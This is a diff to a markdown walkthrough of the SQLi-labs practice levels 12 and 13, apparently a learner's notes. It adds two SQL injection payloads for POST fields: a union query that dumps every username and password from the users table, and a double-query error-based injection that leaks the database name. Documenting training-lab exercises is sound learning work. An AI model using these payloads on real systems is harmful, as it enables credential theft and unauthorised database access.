@@ -136,6 +136,25 @@ we logged in as the first user in the database
 
 ![image](https://user-images.githubusercontent.com/61080375/114437862-b5cea680-9be4-11eb-8771-72fd9d52e082.png)
 
+less-12
+=======
+
+It is same as  less 11 we are doing injection in post parameter ``username`` or ``password`` fields
+payload ``Dum")union select group_concat(username),group_concat(password) from users#``
+
+![image](https://user-images.githubusercontent.com/61080375/115436326-7af1f180-a228-11eb-94a6-c5d9da56cfd3.png)
+
+less-13
+=======
+It is double query  injection in post fields
+
+payload : ``Dumb') and (select 1 from(select count(*),concat((select database()),floor(rand()*2))a from information_schema.tables group by a)b)#``
+
+![image](https://user-images.githubusercontent.com/61080375/115437955-74fd1000-a22a-11eb-9fce-f62cebfaf0f9.png)
+
+less-14
+=======
+
 
 
 less-18
